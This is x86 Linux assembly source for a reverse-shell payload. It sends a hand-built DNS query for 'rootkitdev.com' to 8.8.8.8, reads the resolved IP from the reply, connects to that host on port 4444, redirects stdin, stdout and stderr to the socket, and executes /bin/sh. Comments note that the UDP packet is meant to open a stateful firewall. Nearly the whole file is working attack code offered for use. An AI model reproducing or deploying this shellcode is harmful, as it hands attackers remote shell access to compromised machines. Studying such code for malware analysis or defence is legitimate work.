

;Author : Krash

section     .text
global      main   ;must be declared for linker (ld)

; Special thanks to James Routley For disecting the DNS protocol. 
; https://routley.io/tech/2017/12/28/hand-writing-dns-messages.html
; Special Thanks to Linux Trovalds for the SysCall map Needed for Syscall documentation . 
; https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_32.tbl
; Useful for looking at HEX IP addresses. 
; https://ncalculators.com/digital-computation/ip-address-hex-decimal-binary.htm
; Useful for converting hex to ASCII 
; https://www.rapidtables.com/convert/number/hex-to-ascii.html
; Thanks to  GOUTHAM MADHWARAJ for the reverse shell example. 
; https://barriersec.com/2018/11/linux-x86-reverse-shell-shellcode/



; SOCKETCALL PARAMS You can pass a value to EBX to utilize one of these functions. 

; #define SYS_SOCKET      1               /* sys_socket(2)                */
; #define SYS_BIND        2               /* sys_bind(2)                  */
; #define SYS_CONNECT     3               /* sys_connect(2)               */
; #define SYS_LISTEN      4               /* sys_listen(2)                */
; #define SYS_ACCEPT      5               /* sys_accept(2)                */
; #define SYS_GETSOCKNAME 6               /* sys_getsockname(2)           */
; #define SYS_GETPEERNAME 7               /* sys_getpeername(2)           */
; #define SYS_SOCKETPAIR  8               /* sys_socketpair(2)            */
; #define SYS_SEND        9               /* sys_send(2)                  */
; #define SYS_RECV        10              /* sys_recv(2)                  */
; #define SYS_SENDTO      11              /* sys_sendto(2)                */
; #define SYS_RECVFROM    12              /* sys_recvfrom(2)              */
; #define SYS_SHUTDOWN    13              /* sys_shutdown(2)              */
; #define SYS_SETSOCKOPT  14              /* sys_setsockopt(2)            */
; #define SYS_GETSOCKOPT  15              /* sys_getsockopt(2)            */
; #define SYS_SENDMSG     16              /* sys_sendmsg(2)               */
; #define SYS_RECVMSG     17              /* sys_recvmsg(2)               */
; #define SYS_ACCEPT4     18              /* sys_accept4(2)               */
; #define SYS_RECVMMSG    19              /* sys_recvmmsg(2)              */
; #define SYS_SENDMMSG    20              /* sys_sendmmsg(2)              */


;The Message We want to send.
;AA AA 01 00 00 01 00 00 00 00 00 00 0A 72 6f 6f 74 6b 69 74 64 65 76 03 63 6f 6d 00 00 01 00 01


   ;DNS HEADER;
   ; AA AA - ID
   ; 01 00 - Query parameters
   ; 00 01 - Number of questions
   ; 00 00 - Number of answers
   ; 00 00 - Number of authority records
   ; 00 00 - Number of additional records
   ; DNS QUESTION --
   ; 07 - 'example' has length 7, ;so change this to be the length of domain ; keep in mind there are not '.' in the question.
   ; 65 - e
   ; 78 - x
   ; 61 - a
   ; 6D - m
   ; 70 - p
   ; 6C - l
   ; 65 - e

   ; 03 - subdomain '.com'  length 03  ; change this to be the length of type.

   ; 63 - c
   ; 6F - o
   ; 6D - m

   ; 00    - zero byte to end the QNAME 
   ; 00 01 - QTYPE 
   ; 00 01 - QCLASS

   ; DNS ANSWER!
   ; aa aa
   ; 81 80
   ; 00 01
   ; 00 01
   ; 00 00
   ; 00 00
   ; 07 65
   ; 78 61
   ; 6d 70
   ; 6c 65
   ; 03 63
   ; 6f 6d
   ; 00 00
   ; 01 00
   ; 01 c0
   ; 0c 00
   ; 01 00
   ; 01 00
   ; 00 12
   ; 8d 00
   ; 04 

   ; IP ADDRESS IN HEX -- 93.184.216.34
   ; 5d
   ; b8 
   ; d8
   ; 22



main:                                         
    ; we create a socket fd, using again syscall 0x66 and argument SYS_SOCKET so ebx = 1  
    push   0x66
    pop    eax
    push   0x1 
    pop    ebx
    xor    ecx,ecx
    push   ecx
    ; but this times it will be a SOCK_DGRAM UDP, so 0x2 as argument 
    push   0x2  
    push   0x2 
    mov    ecx,esp
    int    0x80 ; SYS_SOCKET
    ; saving fd on the stack ; In reality I think I will save the port here instead 
    push eax


    push 0x08080808 ; 8.8.8.8 ; I love that this doesn't really need to be backwards.
    ;push 0x0100007F            ; 0100007F 1.0.0.127 for testing...

    xor edx,edx
    mov dh, 0x35  ; port 53; comment this for variable port 
    push dx       ; comment this for variable port 
                  ; push word PORT ; UNcomment this for variable port 
    push word 0x2 ; 




    mov ecx,esp   ; save pointer to ecx 
    push 0x10     ; addrlen 
    push ecx      ; pointer to sockaddr 
    push eax      ; fd received previously 
    mov ecx,esp   ;  
    mov esi,eax   ; save fd for next call 
    xor eax,eax 
    mov al,0x66  
    add bl,0x2   ; BL  = 3 SYS_CONNECT
    int 0x80      ;CALL  SYS_CONNECT


    ; now we send a UDP packet to open stateful firewall :] 
    xor eax,eax
    mov al,0x66   

    ; push 0x00000001 ; Origional Working Example        
    ; push 0x00010000
    ; push 0x6d6f6303
    ; push 0x656c706d
    ; push 0x61786507  ; sizeof (MyDomain) 72 6f 6f 74 6b 69 74 64 65 76 Now we move this in backwards
    ; push 0x00000000
    ; push 0x00000100
    ; push 0x0001AAAA

      push 0x00000000
  push 0x01000100
  push 0x006d6f63
  push 0x03766564
  push 0x74696b74
  push 0x6f6f720a
  push 0x00000000
  push 0x00000100
  push 0x0001AAAA




    mov edx,esp ; Move the string to EDX so we can send it. 
    xor ecx,ecx
    push ecx  
    push 64 ; size of message to be sent is 8
    push edx 
    push esi 
    mov ecx,esp
    xor ebx,ebx 
    mov bl,0x9 
    int 0x80     ;CALL SYS_SEND

   ; cd ; Change Directional flag. I am not sure if it's needed yet.

    mov eax,  3 ; Prepare for SYSCALL_READ
    mov ebx,  3 ; 
    mov ecx, esp
    mov edx, 100
    int 0x80   ;CALL SYSCALL_READ
    
    add esp, eax
    sub esp, 4 
    mov eax ,[esp]
    ;bswap eax
    push eax ; Probably not needed, I just want to ensure it's saved. 
    mov ebp, eax

 ;###################################
 ;
 ;     SET UP FOR REVERSE SHELL!!!
 ;
 ;###################################

;
	; int socketcall(int call, unsigned long *args);
	; sockfd = socket(int socket_family, int socket_type, int protocol);
	;
	push 0x66 
	pop eax ;syscall: sys_socketcall + cleanup eax

	push 0x1
	pop ebx ;sys_socket (0x1) + cleanup ebx

	xor edx,edx ;cleanup edx

	push edx ;protocol=IPPROTO_IP (0x0)	
	push ebx ;socket_type=SOCK_STREAM (0x1)
	push 0x2 ;socket_family=AF_INET (0x2)

	mov ecx, esp ;save pointer to socket() args

	int 0x80 ;exec sys_socket

	xchg edx, eax; save result (sockfd) for later usage

	;
	; int socketcall(int call, unsigned long *args);
	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	;
	mov al, 0x66

    ;4444
   ; mov ebp , 0x0100007f  ;sin_addr=127.1.1.1 (network byte order)
    push ebp ; Pushing our saved IP.

  xor ecx, ecx 

  mov cx , 0x5c11  ; ;push word 0x5c11 ;sin_port=4444 (network byte order)
  push cx
	 
	
	inc ebx          
	push word bx     ;sin_family=AF_INET (0x2)
	mov ecx, esp     ;save pointer to sockaddr struct

	push 0x10 ;addrlen=16
	push ecx  ;pointer to sockaddr
	push edx  ;sockfd

	mov ecx, esp ;save pointer to sockaddr_in struct

	inc ebx ; sys_connect (0x3)

	int 0x80 ;exec sys_connect 

	;
	; int socketcall(int call, unsigned long *args);
	; int dup2(int oldfd, int newfd);
	;
	push 0x2
	pop ecx  ;set loop-counter

	xchg ebx,edx ;save sockfd

; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
loop:
	mov al, 0x3f ;syscall: sys_dup2 
	int 0x80     ;exec sys_dup2
	dec ecx	     ;decrement loop-counter
	jns loop     ;as long as SF is not set -> jmp to loop

	;
	; int execve(const char *filename, char *const argv[],char *const envp[]);
	;
	mov al, 0x0b ; syscall: sys_execve

	inc ecx      ;argv=0
	mov edx,ecx  ;envp=0

	push edx        ;terminating NULL
	push 0x68732f2f	;"hs//"
	push 0x6e69622f	;"nib/"

	mov ebx, esp ;save pointer to filename

	int 0x80 ; exec sys_execve



